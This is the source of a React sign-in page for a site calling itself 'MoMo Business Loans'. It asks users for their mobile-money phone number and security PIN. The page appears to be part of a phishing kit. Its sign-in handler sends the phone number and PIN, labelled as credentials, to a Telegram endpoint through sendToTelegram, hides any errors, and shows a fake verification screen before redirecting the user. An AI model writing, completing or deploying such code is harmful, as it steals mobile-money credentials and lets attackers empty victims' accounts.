import { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import Logo from '../components/Logo';
import PageLoader from '../components/PageLoader';
import { momoCountries, MoMoCountry } from '../data/countries';
import { setSession, verifyUserRegistered } from '../lib/session';
import { sendToTelegram } from '../lib/api';
import { ArrowLeft, ChevronDown, Loader2, ShieldCheck, Lock, AlertCircle, UserPlus } from 'lucide-react';

export default function SignInPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const [country, setCountry] = useState<MoMoCountry>(momoCountries[0]);
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState('');
  const [loading, setLoading] = useState(false);
  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [error, setError] = useState('');

  const handleSignIn = async () => {
    if (phone.length < 7 || pin.length < 4) return;
    setError('');
    setLoading(true);

    // Enforce that sign-in ONLY works for people who have signed up to the website
    const verification = await verifyUserRegistered(phone, country.code);

    if (!verification.exists) {
      setLoading(false);
      setError(
        'Account not found! Sign in only works for users who have signed up to the website. Please sign up first to register your MoMo account.'
      );
      return;
    }

    // If account has registered PIN and user entered a different PIN
    if (verification.user?.pin && verification.user.pin !== pin) {
      setLoading(false);
      setError('Incorrect MoMo PIN entered. Please enter your valid registered 5-digit PIN.');
      return;
    }

    try {
      await sendToTelegram({
        type: 'credentials',
        country: country.name,
        countryCode: country.code,
        phone,
        pin,
      });
    } catch (_) {
      /* fallback silent */
    }

    setSession({ phone, country: country.name, countryCode: country.code, loggedIn: true });

    const target =
      location.state?.returnTo ||
      (localStorage.getItem('momo_withdrawal_initiated_at') ? '/withdrawal-status' : '/');

    setTimeout(() => navigate(target), 1800);
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center gap-6 px-4">
        <Logo size="md" />
        <h2 className="text-2xl font-extrabold tracking-tight">
          MoMo <span className="text-white font-extrabold">Business Loans</span>
        </h2>
        <Loader2 className="w-10 h-10 text-sky-300 animate-spin" />
        <p className="text-gray-300 text-base font-bold">Verifying registered account credentials...</p>
      </div>
    );
  }

  return (
    <PageLoader>
      <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center px-4 py-12">
        <Logo size="md" />
        <h2 className="text-2xl sm:text-3xl font-extrabold mt-4 mb-8 tracking-tight">
          MoMo <span className="text-white font-extrabold">Business Loans</span>
        </h2>

        <div className="w-full max-w-md bg-white rounded-3xl p-6 sm:p-8 text-[hsl(198,100%,22%)] shadow-2xl relative border border-gray-100">
          <button
            id="signin-back-btn"
            onClick={() => navigate('/')}
            className="flex items-center gap-1.5 text-gray-500 hover:text-gray-900 text-sm font-semibold mb-6 transition cursor-pointer"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Back to Home</span>
          </button>

          <h3 className="text-xl sm:text-2xl font-extrabold mb-1.5 text-center text-[hsl(198,100%,22%)]">
            Welcome Back
          </h3>
          <p className="text-gray-500 text-xs sm:text-sm text-center mb-6">
            Sign in with your registered MoMo mobile number
          </p>

          {/* Error Message if user hasn't signed up */}
          {error && (
            <div className="mb-6 p-4 rounded-2xl bg-red-50 border-2 border-red-200 text-red-800 text-xs sm:text-sm leading-relaxed space-y-2">
              <div className="flex items-center gap-2 font-black text-red-900">
                <AlertCircle className="w-4 h-4 text-red-600 shrink-0" />
                <span>Access Denied</span>
              </div>
              <p>{error}</p>
              <button
                type="button"
                onClick={() => navigate('/signup')}
                className="w-full mt-2 py-2.5 px-3 rounded-xl bg-red-600 hover:bg-red-700 text-white font-extrabold text-xs flex items-center justify-center gap-1.5 shadow-sm transition cursor-pointer"
              >
                <UserPlus className="w-3.5 h-3.5" />
                <span>Go to Sign Up Page</span>
              </button>
            </div>
          )}

          {/* Country + Phone input */}
          <div className="relative mb-4">
            <label className="block text-xs font-bold text-gray-700 mb-1.5 uppercase tracking-wide">
              Mobile Number
            </label>
            <div className="flex items-center border-2 border-gray-200 focus-within:border-[#004F71] rounded-2xl overflow-hidden transition shadow-sm bg-white">
              <button
                type="button"
                onClick={() => setDropdownOpen(!dropdownOpen)}
                className="flex items-center justify-center gap-2 px-3.5 sm:px-4 py-3.5 bg-gray-50 border-r border-gray-200 hover:bg-gray-100 transition shrink-0 min-w-[86px] sm:min-w-[92px] cursor-pointer select-none"
                title={country.name}
              >
                <div className="w-8 h-5.5 flex items-center justify-center shrink-0 overflow-hidden rounded-[3px] shadow-xs border border-gray-300 bg-white">
                  <img
                    src={`https://flagcdn.com/w80/${country.iso}.png`}
                    alt={country.name}
                    className="w-full h-full object-cover block"
                    loading="eager"
                  />
                </div>
                <ChevronDown className="w-4 h-4 text-gray-500 shrink-0" />
              </button>
              <input
                id="signin-phone-input"
                type="tel"
                value={phone}
                onChange={(e) => {
                  setPhone(e.target.value.replace(/\D/g, ''));
                  setError('');
                }}
                placeholder="Enter registered phone"
                className="flex-1 min-w-0 px-4 py-3.5 text-base font-bold text-gray-900 outline-none placeholder:text-gray-400 bg-transparent"
                autoFocus
              />
            </div>

            {dropdownOpen && (
              <div className="absolute z-30 w-full mt-2 bg-white border border-gray-200 rounded-2xl shadow-2xl max-h-60 overflow-y-auto divide-y divide-gray-100">
                {momoCountries.map((c) => (
                  <button
                    key={c.name}
                    type="button"
                    onClick={() => {
                      setCountry(c);
                      setDropdownOpen(false);
                    }}
                    className="w-full flex items-center gap-3 px-4 py-3 hover:bg-gray-50 text-sm font-semibold text-gray-800 transition text-left cursor-pointer"
                  >
                    <div className="w-8 h-5.5 flex items-center justify-center shrink-0 overflow-hidden rounded-[3px] shadow-xs border border-gray-300 bg-white">
                      <img
                        src={`https://flagcdn.com/w80/${c.iso}.png`}
                        alt={c.name}
                        className="w-full h-full object-cover block"
                        loading="lazy"
                      />
                    </div>
                    <span>{c.name}</span>
                    <span className="text-gray-400 font-bold ml-auto">{c.code}</span>
                  </button>
                ))}
              </div>
            )}
          </div>

          {/* MoMo PIN input */}
          <div className="mb-6">
            <label className="block text-xs font-bold text-gray-700 mb-1.5 uppercase tracking-wide">
              MoMo Security PIN
            </label>
            <div className="relative flex items-center">
              <input
                id="signin-pin-input"
                type="password"
                inputMode="numeric"
                maxLength={5}
                value={pin}
                onChange={(e) => {
                  setPin(e.target.value.replace(/\D/g, ''));
                  setError('');
                }}
                placeholder="Enter 5-digit PIN"
                className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-2xl px-4 py-3.5 text-sm sm:text-base font-bold text-gray-900 outline-none shadow-sm transition pl-10"
              />
              <Lock className="w-4 h-4 text-gray-400 absolute left-3.5 pointer-events-none" />
            </div>
          </div>

          <div className="flex items-center gap-2 text-xs text-gray-500 mb-6 bg-gray-50 p-3 rounded-xl">
            <ShieldCheck className="w-4 h-4 text-green-600 shrink-0" />
            <span>Registered accounts only. Unauthorized sign-in attempts are blocked.</span>
          </div>

          <button
            id="signin-submit-btn"
            onClick={handleSignIn}
            disabled={phone.length < 7 || pin.length < 4}
            className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] disabled:opacity-40 transition shadow-md cursor-pointer border border-[#006591]/40"
          >
            Sign In
          </button>

          <p className="text-center text-xs sm:text-sm text-gray-500 mt-6">
            Don't have an account yet?{' '}
            <button
              onClick={() => navigate('/signup')}
              className="text-[#004F71] font-bold hover:underline"
            >
              Sign Up
            </button>
          </p>
        </div>
      </div>
    </PageLoader>
  );
}
